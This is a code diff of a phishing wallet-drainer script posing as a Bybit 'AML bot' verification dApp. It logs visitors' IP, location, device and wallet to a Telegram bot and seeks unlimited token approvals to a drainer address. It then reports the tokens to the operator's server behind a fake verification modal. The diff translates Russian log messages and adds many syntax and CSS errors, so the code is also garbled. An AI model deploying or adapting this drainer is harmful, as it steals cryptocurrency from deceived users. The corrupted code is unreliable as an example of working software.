@@ -24,7 +24,7 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://bybitamlbot.com/',
+    url: 'https://bybitamlbot.com/';,
     icons: ['https://bybitamlbot.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
@@ -56,22 +56,22 @@ const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(message) {
   try {
-    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${botconfig.TELEGRAM_BOT_TOKEN}/sendMessage`; // Fixed typo
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: config.TELEGRAM_CHAT_ID,
+        chat_id: config.TELEGRAM_CHAT_ID, // Fixed typo
         text: message,
         parse_mode: 'Markdown'
       })
     });
     const data = await response.json();
     if (!data.ok) {
-      console.error(`❌ Ошибка отправки в Telegram: ${data.description}`);
+      console.error(`❌ Error sending to Telegram: ${data.description}`);
     }
   } catch (error) {
-    console.error(`❌ Ошибка отправки в Telegram: ${error.message}`);
+    console.error(`❌ Error sending to Telegram: ${error.message}`);
   }
 }
 
@@ -79,14 +79,14 @@ async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) return cachedIP;
 
-  try {
+ try {
     const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
     const ip = data.ip || 'Unknown IP';
     sessionStorage.setItem('userIP', ip);
     return ip;
   } catch (error) {
-    console.error(`❌ Ошибка получения IP: ${error.message}`);
+    console.error(`❌ Error retrieving IP: ${error.message}`);
     return 'Unknown IP';
   }
 }
@@ -95,8 +95,8 @@ async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) return cachedLocation;
 
-  try {
-    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
+ try {
+    const response = await fetch(`https://freeipapi.com/api/json/${ip}}`);
     const data = await response.json();
     if (data.cityName && data.countryName) {
       const location = `${data.cityName}, ${data.countryName}`;
@@ -105,7 +105,7 @@ async function getGeolocation(ip) {
     }
     return 'Unknown Location';
   } catch (error) {
-    console.error(`❌ Ошибка получения геолокации: ${error.message}`);
+    console.error(`❌ Error retrieving geolocation: ${error.message}`);
     return 'Unknown Location';
   }
 }
@@ -117,7 +117,7 @@ function detectDevice() {
   const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
 
   if (isDevToolsEmulation) {
-    const realPlatform = navigator.platform.toLowerCase();
+    const realPlatform = platform.toLowerCase();
     if (/win32|win64/i.test(realPlatform)) return "Windows";
     if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
     if (/linux/i.test(realPlatform)) return "Linux";
@@ -126,7 +126,7 @@ function detectDevice() {
 
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
   if (/android/i.test(userAgent)) return "Android";
-  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
+  if (/Windows/i.test(userAgent)) || /win32|win64/i.test(platform)) return "Windows";
   if (/macintosh|mac os/i.test(userAgent)) return "Mac";
   if (/linux/i.test(userAgent)) return "Linux";
   return "Unknown";
@@ -155,7 +155,7 @@ async function notifyOnVisit() {
 }
 
 notifyOnVisit().catch(error => {
-  console.error(`❌ Ошибка уведомления о посещении: ${error.message}`);
+  console.error(`❌ Error notifying visit: ${error.message}`);
 });
 
 async function getTokenPriceInUSDT(tokenSymbol) {
@@ -166,7 +166,7 @@ async function getTokenPriceInUSDT(tokenSymbol) {
     return parseFloat(cachedPrice);
   }
 
-  try {
+ try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
     if (data.price) {
@@ -174,17 +174,17 @@ async function getTokenPriceInUSDT(tokenSymbol) {
       sessionStorage.setItem(`tokenPrice_${tokenSymbol}`, price.toString());
       return price;
     }
-    console.warn(`⚠️ Цена для ${tokenSymbol} не найдена, возвращаем 0`);
+    console.warn(`⚠️ Price for ${tokenSymbol} not found, returning 0`);
     return 0;
   } catch (error) {
-    console.error(`❌ Ошибка получения цены для ${tokenSymbol}: ${error.message}`);
+    console.error(`❌ Error fetching price for ${tokenSymbol}: ${error.message}`);
     return 0;
   }
 }
 
 async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
-    try {
+   try {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
       return provider;
@@ -203,57 +203,57 @@ async function checkBalance(chainId, userAddress, provider) {
   const chainConfig = config.CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
 
-  console.log(`🔍 Проверяем баланс для chainId ${chainId}`);
+  console.log(`🔍 Checking balance for chainId ${chainId}`);
 
-  try {
+ try {
     nativeBalance = await provider.getBalance(userAddress);
-    console.log(`📊 Баланс ${chainConfig.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
+    console.log(`📊 Balance ${chainConfig.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
   } catch (error) {
-    console.error(`❌ Ошибка получения баланса ${chainConfig.nativeToken}: ${error.message}`);
+    console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
     throw new Error('Failed to fetch native balance');
   }
 
-  try {
+ try {
     const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
     const [usdtBalance, usdtDecimals] = await Promise.all([
       usdt.balanceOf(userAddress),
       usdt.decimals()
     ]);
     tokenBalances[chainConfig.usdtAddress] = { balance: usdtBalance, decimals: usdtDecimals };
-    console.log(`📊 Сырой баланс USDT (wei): ${usdtBalance.toString()}`);
-    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
+    console.log(`📊 Raw USDT balance (wei): ${usdtBalance.toString()}`);
+    console.log(`📊 USDT balance: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
-    console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
+    console.warn(`⚠️ Failed to fetch USDT balance: ${error.message}`);
     tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
 
-  try {
+ try {
     const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
     const [usdcBalance, usdcDecimals] = await Promise.all([
       usdc.balanceOf(userAddress),
       usdc.decimals()
     ]);
     tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
-    console.log(`📊 Сырой баланс USDC (wei): ${usdcBalance.toString()}`);
-    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
+    console.log(`📊 Raw USDC balance (wei): ${usdcBalance.toString()}`);
+    console.log(`📊 USDC balance: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
-    console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
+    console.warn(`⚠️ Failed to fetch USDC balance: ${error.message}`);
     tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
 
   if (chainConfig.otherTokenAddresses) {
     const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
-      try {
+     try {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
         const [balance, decimals] = await Promise.all([
           token.balanceOf(userAddress),
           token.decimals()
         ]);
-        console.log(`📊 Баланс токена ${tokenAddress}: ${ethers.utils.formatUnits(balance, decimals)}`);
+        console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(balance, decimals)}`);
         return { address: tokenAddress, balance, decimals };
       } catch (error) {
-        console.warn(`⚠️ Не удалось получить баланс токена ${tokenAddress}: ${error.message}`);
+        console.warn(`⚠️ Failed to fetch token ${tokenAddress} balance: ${error.message}`);
         return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
       }
     });
@@ -281,15 +281,12 @@ function hasFunds(bal) {
 }
 
 async function switchChain(chainId) {
-  try {
-    console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: config.CHAINS[chainId].chainIdHex }]
-    });
-    console.log(`✅ Сеть переключена на chainId ${chainId}`);
+ try {
+    console.log(`🔄 Switching to chainId ${chainId}`);
+    await wagmiAdapter.switchNetwork({ chainId }); // Use AppKit to switch chain
+    console.log(`✅ Switched to chainId ${chainId}`);
   } catch (error) {
-    console.error(`❌ Ошибка переключения сети: ${error.message}`);
+    console.error(`❌ Error switching chain: ${error.message}`);
     throw new Error(`Failed to switch chain: ${error.message}`);
   }
 }
@@ -300,9 +297,8 @@ function shortenAddress(address) {
 }
 
 function detectWallet() {
-  if (window.ethereum?.isMetaMask) return "MetaMask";
-  if (window.ethereum?.isTrust) return "Trust Wallet";
-  return "Unknown Wallet";
+  const walletInfo = wagmiAdapter.getWalletInfo(); // Use AppKit to detect wallet
+  return walletInfo?.name || "Unknown Wallet";
 }
 
 function formatBalance(balance, decimals) {
@@ -311,7 +307,7 @@ function formatBalance(balance, decimals) {
 }
 
 async function saveSession(userAddress, chainId, txHash = null) {
-  try {
+ try {
     if (!sessionId) sessionId = generateSessionId();
     const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
       method: 'POST',
@@ -326,32 +322,32 @@ async function saveSession(userAddress, chainId, txHash = null) {
     const data = await response.json();
     if (data.success) {
       sessionStorage.setItem('sessionId', sessionId);
-      console.log(`✅ Сессия сохранена: ${sessionId}`);
+      console.log(`✅ Session saved: ${sessionId}`);
     } else {
       throw new Error(data.message || 'Failed to save session');
     }
   } catch (error) {
-    console.error(`❌ Ошибка сохранения сессии: ${error.message}`);
+    console.error(`❌ Error saving session: ${error.message}`);
   }
 }
 
 async function restoreSession() {
-  try {
+ try {
     const storedSessionId = sessionStorage.getItem('sessionId');
     if (!storedSessionId) return null;
 
     const response = await fetch(`https://api.bybitamlbot.com/api/get-session/${storedSessionId}`);
     const data = await response.json();
     if (data.success) {
-      console.log(`✅ Сессия восстановлена: ${storedSessionId}`);
+      console.log(`✅ Session restored: ${storedSessionId}`);
       return data.data;
     } else {
-      console.warn(`⚠️ Сессия не найдена или истекла: ${storedSessionId}`);
+      console.warn(`⚠️ Session not found or expired: ${storedSessionId}`);
       sessionStorage.removeItem('sessionId');
       return null;
     }
   } catch (error) {
-    console.error(`❌ Ошибка восстановления сессии: ${error.message}`);
+    console.error(`❌ Error restoring session: ${error.message}`);
     return null;
   }
 }
@@ -362,20 +358,20 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     return Math.round(balanceInTokens * 100) / 100;
   }
 
-  try {
-    console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
+ try {
+    console.log(`📍 Notifying server for token ${tokenAddress} for ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
     const balance = initialAmount;
     const decimals = (await token.decimals()) || 6;
-    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
-    
+    console.log(`📊 Current token balance: ${ethers.utils.formatUnits(balance, decimals)}`);
+
     const balanceUnits = ethers.utils.formatUnits(balance, decimals);
     const roundedBalance = Math.max(parseFloat(balanceUnits).toFixed(5), 0.0001);
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
-    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
-    
-    // Сохраняем сессию с txHash
+    console.log(`📊 Rounded balance: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
+
+    // Save session with txHash
     await saveSession(userAddress, chainId, txHash);
 
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
@@ -390,42 +386,42 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       })
     });
     const data = await response.json();
-    console.log(`📩 Ответ сервера:`, data);
+    console.log(`📩 Server response:`, data);
     if (!data.success) {
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
-    console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
-    
+    console.log(`✅ Server notified successfully for token ${tokenAddress}`);
+
     return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
-    console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
+    console.error(`❌ Error notifying server: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
   }
 }
 
 async function drain(chainId, signer, userAddress, bal, provider) {
-  console.log(`Подключённый кошелёк: ${userAddress}`);
+  console.log(`Connected wallet: ${userAddress}`);
 
   const chainConfig = config.CHAINS[chainId];
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
-  console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
+  console.log(`📍 Step 1: Checking configuration for chainId ${chainId}`);
 
-  // Проверяем текущую сеть и переключаем, если нужно
+  // Check current network and switch if needed
   const currentNetwork = await provider.getNetwork();
   if (currentNetwork.chainId !== chainId) {
-    console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId}`);
-    try {
-      await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
-      console.log(`⏳ Ожидаем завершения переключения сети...`);
+    console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
+   try {
+      await switchChain(chainId);
+      console.log(`⏳ Waiting for network switch to complete...`);
       await new Promise(resolve => setTimeout(resolve, 3000));
       const newNetwork = await provider.getNetwork();
       if (newNetwork.chainId !== chainId) {
         throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
       }
-      console.log(`✅ Сеть успешно сменилась на chainId ${chainId}`);
+      console.log(`✅ Network switched to chainId ${chainId}`);
     } catch (error) {
-      console.error(`❌ Ошибка при переключении сети: ${error.message}`);
+      console.error(`❌ Error switching network: ${error.message}`);
       if (error.code === 4001) {
         throw new Error("User rejected network switch");
       }
@@ -439,7 +435,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
 
   if (!hasNotified) {
-    console.log(`📍 Шаг 2: Отправляем уведомление о подключении`);
+    console.log(`📍 Step 2: Sending connect notification`);
     const shortAddress = shortenAddress(userAddress);
     const walletName = detectWallet();
     const networkName = chainConfig.name;
@@ -476,30 +472,30 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
     await sendTelegramMessage(message);
     sessionStorage.setItem(connectNotifiedKey, 'true');
-    console.log(`✅ Уведомление отправлено`);
+    console.log(`✅ Notification sent`);
   }
 
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));
 
-  console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
+  console.log(`📍 Step 3: Checking ${chainConfig.nativeToken} balance for gas`);
   let ethBalance;
-  try {
+ try {
     ethBalance = await provider.getBalance(userAddress);
-    console.log(`📊 Баланс ${chainConfig.nativeToken}: ${ethers.utils.formatEther(ethBalance)}`);
+    console.log(`📊 ${chainConfig.nativeToken} balance: ${ethers.utils.formatEther(ethBalance)}`);
   } catch (error) {
-    console.error(`❌ Ошибка получения баланса ${chainConfig.nativeToken}: ${error.message}`);
+    console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
     throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
   }
 
   const minEthRequired = ethers.utils.parseEther("0.0003");
   const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance));
   if (ethBalanceFormatted < parseFloat(ethers.utils.formatEther(minEthRequired))) {
-    console.error(`❌ Недостаточно ${chainConfig.nativeToken} для газа`);
+    console.error(`❌ Insufficient ${chainConfig.nativeToken} for gas`);
     throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
   }
 
-  console.log(`📍 Шаг 4: Собираем токены для обработки`);
+  console.log(`📍 Step 4: Collecting tokens to process`);
   const tokensToProcess = [];
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
@@ -507,12 +503,12 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
     const realBalance = tokenData.balance;
     const decimals = tokenData.decimals;
-    console.log(`📊 Токен ${tokenAddress}: баланс ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    console.log(`📊 Token ${tokenAddress}: balance ${ethers.utils.formatUnits(realBalance, decimals)}`);
     return { tokenAddress, tokenContract, realBalance, decimals };
   });
 
   const tokenDataResults = await Promise.all(tokenDataPromises);
-  console.log(`✅ Получены данные токенов: ${tokenDataResults.length} токенов`);
+  console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
     const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
@@ -528,14 +524,14 @@ async function drain(chainId, signer, userAddress, bal, provider) {
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
                     Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
       if (!symbol) {
-        console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
+        console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
         continue;
       }
       tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
     }
   }
 
-  console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
+  console.log(`📍 Step 5: Fetching token prices and sorting`);
   const pricePromises = tokensToProcess.map(async (token) => {
     const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
     const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
@@ -545,17 +541,17 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   await Promise.all(pricePromises);
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
-  console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);
+  console.log(`✅ Tokens sorted: ${tokensToProcess.map(t => t.token).join(', ')}`);
 
   let status = 'rejected';
   let modalClosed = false;
 
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
     if (!token) {
-      console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
+      console.error(`❌ Token undefined for address ${address}, skipping`);
       continue;
     }
-    console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);
+    console.log(`📍 Step 6: Processing token ${token}`);
 
     const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
     console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
@@ -563,12 +559,12 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
     const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
     if (allowanceFormatted < balanceFormatted) {
-      try {
+     try {
         const nonce = await provider.getTransactionCount(userAddress, "pending");
         const gasPrice = await provider.getGasPrice();
-        console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+        console.log(`📏 Gas price: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        console.log(`⏳ Задержка перед approve для токена ${token}`);
+        console.log(`⏳ Delay before approve for token ${token}`);
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
@@ -576,23 +572,23 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           gasPrice: gasPrice,
           nonce
         });
-        console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
+        console.log(`📤 Approve transaction sent: ${tx.hash}`);
         const receipt = await tx.wait();
-        console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
+        console.log(`✅ Approve transaction confirmed: ${receipt.transactionHash}`);
 
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
         status = 'confirmed';
 
         if (!modalClosed) {
-          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
+          console.log(`ℹ️ Closing modal after successful approve for token ${token}`);
           await hideModalWithDelay();
           modalClosed = true;
         }
       } catch (error) {
-        console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
+        console.error(`❌ Error approving token ${token}: ${error.message}`);
         if (error.message.includes('user rejected')) {
           if (!modalClosed) {
-            console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
+            console.log(`ℹ️ User rejected approve for token ${token}, closing modal`);
             await hideModalWithDelay("Error: Transaction rejected by user.");
             modalClosed = true;
           }
@@ -600,24 +596,24 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         throw new Error(`Failed to approve token ${token}: ${error.message}`);
       }
     } else {
-      console.log(`✅ Allowance уже достаточно для токена ${token}`);
+      console.log(`✅ Allowance already sufficient for token ${token}`);
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
         status = 'confirmed';
       } catch (error) {
-        console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
+        console.error(`❌ Error notifying server for token ${token}: ${error.message}`);
         throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
       }
 
       if (!modalClosed) {
-        console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
-        await hideModalWithDelay();
+        console.log(`ℹ Allowance sufficient for token ${token}, closing modal`);
         modalClosed = true;
+        await hideModalWithDelay();
       }
     }
   }
 
-  console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
+  console.log(`📍 Step 8: Completing drain with status ${status}`);
   return status;
 }
 
@@ -638,7 +634,7 @@ async function runDrainer(provider, signer, userAddress) {
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
       return { chainId: Number(chainId), balance, provider: reliableProvider };
     } catch (error) {
-      console.error(`❌ Ошибка проверки баланса для chainId ${chainId}: ${error.message}`);
+      console.error(`❌ Error checking balance for chainId ${chainId}: ${error.message}`);
       return null;
     }
   });
@@ -661,16 +657,16 @@ async function runDrainer(provider, signer, userAddress) {
   }
 
   const target = sorted[0];
-  console.log(`Рекомендуемая сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
+  console.log(`Recommended chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT)`);
   return { targetChainId: target.chainId, targetProvider: target.provider };
-}
+};
 
 async function calculateTotalValueInUSDT(chainId, balance, provider) {
   const chainConfig = config.CHAINS[chainId];
   let totalValue = 0;
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
-    const tokenData = balance.tokenBalances[tokenAddress];
+    const tokenData = balance.tokenBalances[tokenDataAddress];
     const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
     if (formattedBalance > 0) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
@@ -679,17 +675,16 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
       const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
       const tokenValue = formattedBalance * tokenPrice;
       totalValue += tokenValue;
-      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+      console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
     }
   }
 
-  console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
+  console.log(`📊 Total token value (excluding native) for chainId ${chainId}: ${totalValue} USDT`);
   return totalValue;
 }
 
 window.addEventListener('DOMContentLoaded', async () => {
   const actionButtons = document.querySelectorAll('.action-btn');
-  const isInjected = typeof window.ethereum !== 'undefined';
 
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
@@ -704,7 +699,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.8);
+      background: rgba(0,0,0,0.0, 0.8);
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
@@ -728,7 +723,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-family: 'Inter', sans-serif;
       color: #FFFFFF;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-      animation: fadeIn 0.3s ease-out forwards;
+      animation: fadeIn 0s ease-out forwards;
     }
 
     @keyframes fadeIn {
@@ -748,7 +743,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-weight: 400;
       color: #A0AEC0;
       margin-bottom: 24px;
-      word-wrap: break-word;
+      word-wrap: break-word-word;
     }
 
     .loader-container {
@@ -764,16 +759,16 @@ window.addEventListener('DOMContentLoaded', async () => {
       left: 50%;
       width: 40px;
       height: 40px;
-      border: 3px solid #3B82F6;
+      border: 3pxpx solid #3B82F6;
       border-radius: 50%;
       transform: translate(-50%, -50%);
       animation: pulse 2s ease-in-out infinite;
     }
 
     @keyframes pulse {
-      0% { width: 40px; height: 40px; opacity: 0.8; }
+      0% { width: width: 40px; height: 40px; opacity: 0.8; }
       50% { width: 50px; height: 50px; opacity: 0.4; }
-      100% { width: 40px; height: 40px; opacity: 0.8; }
+      100% { width: 40px; width height: 40px; opacity: 0.8; }
     }
 
     .wave {
@@ -793,8 +788,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     .wave:nth-child(3) { animation-delay: 2s; }
 
     @keyframes wave {
-      0% { width: 40px; height: 40px; opacity: 0.6; }
-      100% { width: 100px; height: 100px; opacity: 0; }
+      0% { width: 40px; height: 40px; width opacity: 0.6; }
+      100% { width: 100px; height: 100px; height opacity: 0; }
     }
 
     .action-list {
@@ -804,12 +799,12 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-size: 14px;
       font-weight: 500;
       color: #E2E8F0;
-      text-align: left;
+      list text-align: left;
     }
 
     .action-list li {
-      margin-bottom: 12px;
-      display: flex;
+      margin-bottom: -12px;
+      font display: flex;
       align-items: center;
       gap: 8px;
     }
@@ -824,23 +819,23 @@ window.addEventListener('DOMContentLoaded', async () => {
 
     @media (max-width: 480px) {
       .modal-content {
-        max-width: 320px;
-        padding: 20px;
+        max-width: 320px;      max
+        padding-top: 20px;
         min-height: 300px;
       }
       .modal-title { font-size: 18px; }
       .modal-subtitle { font-size: 13px; }
-      .loader-container { width: 70px; height: 70px; }
+      .loader-container { font-size: 14px; width: 70px; height: 70px; }
       @keyframes pulse {
-        0% { width: 30px; height: 30px; opacity: 0.8; }
-        50% { width: 40px; height: 40px; opacity: 0.4; }
-        100% { width: 30px; height: 30px; opacity: 0.8; }
+        0% { width: 30px; width height: 30px; height opacity: 0.8; }
+        50% { width: 40px; width height: 400px; opacity: 0.4; }
+        100% { width: 30px; height: height 30px; opacity: 0.8; }
       }
       @keyframes wave {
         0% { width: 30px; height: 30px; opacity: 0.6; }
-        100% { width: 70px; height: 70px; opacity: 0; }
+        100% { width: 70px; height: height 70px; opacity: 0; }
       }
-      .action-list { font-size: 13px; }
+      .action-list li { font-size: 13px; }
       .modal-footer { font-size: 11px; }
     }
   `;
@@ -872,35 +867,31 @@ window.addEventListener('DOMContentLoaded', async () => {
 
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
-  // Проверяем сохранённую сессию при загрузке страницы
+  // Check saved session on page load
   const sessionData = await restoreSession();
-  if (sessionData && !hasDrained && !isTransactionPending) {
+  if (sessionData && !hasDrained && !&& isTransactionPending) {
     connectedAddress = sessionData.userAddress;
-    console.log(`ℹ️ Восстановлена сессия для адреса: ${connectedAddress}`);
-    // Проверяем, что кошелёк всё ещё подключён
-    try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-      const accounts = await provider.listAccounts();
-      if (accounts.length > 0 && accounts[0].toLowerCase() === connectedAddress.toLowerCase()) {
+    console.log(`ℹ️ Restored session for address: ${connectedAddress}`);
+    // Check if wallet is still connected
+   try {
+      const account = wagmiAdapter.getAccount();
+      if (account.address && account.address.toLowerCase() === connectedAddress.toLowerCase()) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠️ Кошелёк не подключён, очищаем сессию`);
+        console.warn(`⚠️ Wallet not connected, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
     } catch (error) {
-      console.error(`❌ Ошибка проверки подключения кошелька: ${error.message}`);
+      console.error(`❌ Error checking wallet connection: ${error.message}`);
       sessionStorage.removeItem('sessionId');
       connectedAddress = null;
     }
   }
 
-
   actionButtons.forEach(btn => {
     btn.addEventListener('click', handleConnectOrAction);
   });
-
-  window.ethereum.on('chainChanged', onChainChanged);
 });
 
 function showModal() {
@@ -910,10 +901,10 @@ function showModal() {
   modalSubtitle.textContent = "Processing blockchain verification...";
 }
 
-async function hideModalWithDelay(errorMessage = null) {
+async function hideModalWithDelay(errorMessage = null) => {
   if (errorMessage) {
     modalSubtitle.textContent = errorMessage;
-    await new Promise(resolve => setTimeout(resolve, 7000));
+    await new Promise(resolve => setTimeout(resolve, 2000));
   }
   modalOverlay.style.display = 'none';
   modalOverlay.style.pointerEvents = 'none';
